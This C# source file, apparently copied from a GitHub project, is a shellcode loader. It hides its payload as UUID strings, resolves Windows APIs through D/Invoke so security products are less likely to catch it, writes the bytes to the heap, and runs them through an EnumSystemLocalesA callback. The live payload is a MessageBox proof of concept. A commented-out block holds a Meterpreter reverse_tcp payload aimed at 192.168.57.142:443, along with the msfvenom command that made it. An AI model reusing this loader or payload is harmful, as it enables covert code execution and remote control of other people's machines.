// stolen from https://github.com/ChoiSG/UuidShellcodeExec/blob/main/USEConsole/Program.cs

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Runtime;
using DInvoke;
using System.Threading;

namespace USEConsole
{
    class Program
    {
        static void Main(string[] args)
        {
            /*
            // Meterpreter uuidstring - msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.57.142 lport=443 -f csharp
            string[] uuids =
            {
                "e48348fc-e8f0-00cc-0000-415141505251",
                "d2314856-4865-528b-6048-8b5218488b52",
                "728b4820-4850-b70f-4a4a-4d31c94831c0",
                "7c613cac-2c02-4120-c1c9-0d4101c1e2ed",
                "48514152-528b-8b20-423c-4801d0668178",
                "0f020b18-7285-0000-008b-808800000048",
                "6774c085-0148-50d0-8b48-18448b402049",
                "56e3d001-ff48-41c9-8b34-884801d64d31",
                "c03148c9-41ac-c9c1-0d41-01c138e075f1",
                "244c034c-4508-d139-75d8-58448b402449",
                "4166d001-0c8b-4448-8b40-1c4901d0418b",
                "01488804-41d0-4158-585e-595a41584159",
                "83485a41-20ec-5241-ffe0-5841595a488b",
                "ff4be912-ffff-495d-be77-73325f333200",
                "49564100-e689-8148-eca0-0100004989e5",
                "0002bc49-bb01-a8c0-398e-41544989e44c",
                "ba41f189-774c-0726-ffd5-4c89ea680101",
                "41590000-29ba-6b80-00ff-d56a0a415e50",
                "c9314d50-314d-48c0-ffc0-4889c248ffc0",
                "41c18948-eaba-df0f-e0ff-d54889c76a10",
                "894c5841-48e2-f989-41ba-99a57461ffd5",
                "0a74c085-ff49-75ce-e5e8-930000004883",
                "894810ec-4de2-c931-6a04-41584889f941",
                "c8d902ba-ff5f-83d5-f800-7e554883c420",
                "6af6895e-4140-6859-0010-000041584889",
                "c93148f2-ba41-a458-53e5-ffd54889c349",
                "314dc789-49c9-f089-4889-da4889f941ba",
                "5fc8d902-d5ff-f883-007d-285841575968",
                "00004000-5841-006a-5a41-ba0b2f0f30ff",
                "415957d5-75ba-4d6e-61ff-d549ffcee93c",
                "48ffffff-c301-2948-c648-85f675b441ff",
                "006a58e7-4959-c2c7-f0b5-a256ffd50000"
            };
            */

            
            // MessageBox PoC - msfvenom -a x64 --platform windows -p windows/x64/messagebox TEXT="hello world" -f csharp 
            string[] uuids =
            {
                "e48148fc-fff0-ffff-e8d0-000000415141",
                "56515250-3148-65d2-488b-52603e488b52",
                "8b483e18-2052-483e-8b72-503e480fb74a",
                "c9314d4a-3148-acc0-3c61-7c022c2041c1",
                "01410dc9-e2c1-52ed-4151-3e488b52203e",
                "483c428b-d001-8b3e-8088-0000004885c0",
                "01486f74-50d0-8b3e-4818-3e448b402049",
                "5ce3d001-ff48-3ec9-418b-34884801d64d",
                "3148c931-acc0-c141-c90d-4101c138e075",
                "034c3ef1-244c-4508-39d1-75d6583e448b",
                "01492440-66d0-413e-8b0c-483e448b401c",
                "3ed00149-8b41-8804-4801-d0415841585e",
                "58415a59-5941-5a41-4883-ec204152ffe0",
                "5a594158-483e-128b-e949-ffffff5d49c7",
                "000000c1-3e00-8d48-95fe-0000003e4c8d",
                "00010a85-4800-c931-41ba-45835607ffd5",
                "41c93148-f0ba-a2b5-56ff-d568656c6c6f",
                "726f7720-646c-4d00-6573-73616765426f",
                "00000078-0000-0000-0000-000000000000"
            };
            


            // Get pointer to DLLs from PEB 
            IntPtr pkernel32 = DInvoke.DynamicInvoke.Generic.GetPebLdrModuleEntry("kernel32.dll");
            IntPtr prpcrt4 = DInvoke.DynamicInvoke.Generic.GetPebLdrModuleEntry("rpcrt4.dll");

            // Function pointers for winapi calls 
            IntPtr pHeapCreate = DInvoke.DynamicInvoke.Generic.GetExportAddress(pkernel32, "HeapCreate");
            IntPtr pHeapAlloc = DInvoke.DynamicInvoke.Generic.GetExportAddress(pkernel32, "HeapCreate");
            IntPtr pEnumSystemLocalesA = DInvoke.DynamicInvoke.Generic.GetExportAddress(pkernel32, "EnumSystemLocalesA");
            IntPtr pUuidFromStringA = DInvoke.DynamicInvoke.Generic.GetExportAddress(prpcrt4, "UuidFromStringA");

            // 1. Heap Create + Alloc 
            object[] heapCreateParam = { (uint)0x00040000, UIntPtr.Zero, UIntPtr.Zero };
            var heapHandle = (IntPtr)DInvoke.DynamicInvoke.Generic.DynamicFunctionInvoke(pHeapCreate, typeof(DELEGATE.HeapCreate), ref heapCreateParam);

            object[] heapAllocParam = { heapHandle, (uint)0, (uint)0x100000 };
            var heapAddr = (IntPtr)DInvoke.DynamicInvoke.Generic.DynamicFunctionInvoke(pHeapAlloc, typeof(DELEGATE.HeapAlloc), ref heapAllocParam);
            //Console.WriteLine("[>] Allocated Heap address - 0x{0}", heapAddr.ToString("x2"));

            // 2. Writing shellcode from UUID to binary to the heap 
            IntPtr newHeapAddr = IntPtr.Zero;
            for (int i = 0; i < uuids.Length; i++)
            {
                newHeapAddr = IntPtr.Add(heapAddr, 16 * i);
                object[] uuidFromStringAParam = { uuids[i], newHeapAddr };
                var status = (IntPtr)DInvoke.DynamicInvoke.Generic.DynamicFunctionInvoke(pUuidFromStringA, typeof(DELEGATE.UuidFromStringA), ref uuidFromStringAParam);

            }

            // 3. Executing shellcode as a callback function 
            object[] enumSystemLocalesAParam = { heapAddr, 0 };
            var result = DInvoke.DynamicInvoke.Generic.DynamicFunctionInvoke(pEnumSystemLocalesA, typeof(DELEGATE.EnumSystemLocalesA), ref enumSystemLocalesAParam);

            // Use this if #3 gies access violation error 
            //var enumSystemLocalesA = Marshal.GetDelegateForFunctionPointer(pEnumSystemLocalesA, typeof(DELEGATE.EnumSystemLocalesA)) as DELEGATE.EnumSystemLocalesA;
            //enumSystemLocalesA(heapAddr, 0);
        }
    }

    public class DELEGATE
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr HeapCreate(uint flOptions, UIntPtr dwInitialSize, UIntPtr dwMaximumSize);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr HeapAlloc(IntPtr hHeap, uint dwFlags, uint dwBytes);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr UuidFromStringA(string StringUuid, IntPtr heapPointer);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool EnumSystemLocalesA(IntPtr lpLocaleEnumProc, int dwFlags);
    }
}
